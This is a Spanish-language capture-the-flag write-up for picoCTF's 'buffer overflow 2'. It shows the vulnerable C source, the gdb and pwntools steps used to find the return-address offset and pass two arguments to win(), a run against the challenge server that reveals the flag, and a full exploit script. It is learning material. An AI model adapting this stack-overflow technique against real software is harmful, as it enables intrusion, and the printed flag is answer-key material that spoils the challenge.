# buffer overflow 2
Control the return address and arguments
hint: 

## Solucion






#### Analisis
- Examinamos el codigo fuente
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in>
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
- tres funciones win, vuln, main, similar al anterior
- ahora win revisa los parametros (CAFEF00D y F00DF00D)
- tendremos que sobreescribir la direccion de retorno y los parametros en reversa 2 luego 1 en litte endian

#### Generamos patron para desborde y calculo del offset
- generamos offset
```python
>>> from pwn import *
>>> cyclic(200)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
>>> 
```
- desbordamos, pero no vemos a donde se va
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/bufferoverflow2]
└─$ echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab" | ./vuln 
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
zsh: done                echo  | 
zsh: segmentation fault  ./vuln
```
- tenemos que desbordar con gdb para ver donde queda la direccion de retorno
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/bufferoverflow2]
└─$ gdb -q vuln

Reading symbols from vuln...
(No debugging symbols found in vuln)
(gdb) r <<< $(echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
Starting program: /home/kali/picoctf/pwning/bufferoverflow2/vuln <<< $(echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()

```
- calculamos el offset buscando y generamos las letras necesarias
```python
>>> cyclic_find(0x62616164)
112
>>> print('A'*112)
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
- obtenemos la direccion de la funcion win en gdb
```bash
(gdb) info address win
Symbol "win" is at 0x8049296 in a file compiled without debugging.
```

- creamos el offset con direccion de retorno a sobreescribir en litte indian
```python
>>> p32(0x8049296)
b'\x96\x92\x04\x08'
>>> print(b'A'*112+b'\x96\x92\x04\x08')
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08'
```
- desbordamos con esa informacion
```bash
(gdb) r <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/picoctf/pwning/bufferoverflow2/vuln <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
Please create 'flag.txt' in this directory with your own debugging flag.
[Inferior 1 (process 21201) exited normally]
(gdb) 
```
- nos damos cuenta que ya estamos dentro de win por que nos pide el archivo de la flag
- creamos la flag.txt dummie 
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/bufferoverflow2]
└─$ echo "flag{dummie}" > flag.txt
```
- volvemos a desbordaar
```bash
(gdb) r <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08')
Starting program: /home/kali/picoctf/pwning/bufferoverflow2/vuln <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) 
```
- ahora se detiene en 0x000000 no tiene forma de saltar por que se perdio el apuntador al stack anterior

x64 stack inverted

#### El agregado de los parametros
- despues de la direccion de retorno hay dos parametros que verifica la funcion **win** antes de poder darnos la flag

- los tenemos que mandar en litte endian

```bash
>>> p32(0xCAFEF00D)
b'\r\xf0\xfe\xca'
>>> p32(0xF00DF00D)
b'\r\xf0\r\xf0'
```
- mandamos
```bash
(gdb) r <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08\r\xf0\xfe\xca\r\xf0\r\xf0')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/picoctf/pwning/bufferoverflow2/vuln <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08\r\xf0\xfe\xca\r\xf0\r\xf0')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA��

Program received signal SIGSEGV, Segmentation fault.
0xcafef00d in ?? ()
```
- el primer parametro cae en la direccion de retorno, eso indica que necesitmos 4 de offset entre la direccion de retorno anterior los agregamos como BBBB
```bash
(gdb) r <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08BBBB\r\xf0\xfe\xca\r\xf0\r\xf0')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/kali/picoctf/pwning/bufferoverflow2/vuln <<< $(echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08BBBB\r\xf0\xfe\xca\r\xf0\r\xf0')
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA�BBBB
flag{dummie}

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
(gdb) 
```
- esto nos da la flag

- lo podemos comprobar poniendo un punto de interrupcion en la comparacion y viendo los valores de la pila
- 
```bash
(gdb) info b
Num     Type           Disp Enb Address    What
2       breakpoint     keep y   0x0804930c <win+118>
	breakpoint already hit 1 time
(gdb) x/4 $ebp
0xffffcfec:	0x41414141	0x42424242	0xcafef00d	0xf00df00d
(gdb) x $ebp+0x8
0xffffcff4:	0xcafef00d
(gdb) x $ebp+0xc
0xffffcff8:	0xf00df00d
(gdb) 


```

- ahora lanzamos en remoto
```bash
┌──(kali㉿kali)-[~/picoctf/pwning/bufferoverflow2]
└─$ echo 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x96\x92\x04\x08BBBB\r\xf0\xfe\xca\r\xf0\r\xf0' | nc saturn.picoctf.net 65112
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAAAAA�BBBB
picoCTF{argum3nt5_4_d4yZ_31432deb}
```

### exploit
```python
def inicio(server=True):
        if(server):
                return remote('saturn.picoctf.ne>
        else:
                return process('./vuln')


overflow = b'A'*112
overflow += p32(0x8049296)
overflow += b'B' * 4
overflow += p32(0xCAFEF00D) 
overflow += p32(0xF00DF00D)

p = inicio()
linea = p.recvuntil(':')
print(linea)
print('[*] Enviando Overflow ..')
p.sendline(overflow)
linea = p.recvall()
print(linea)
p.close()

```
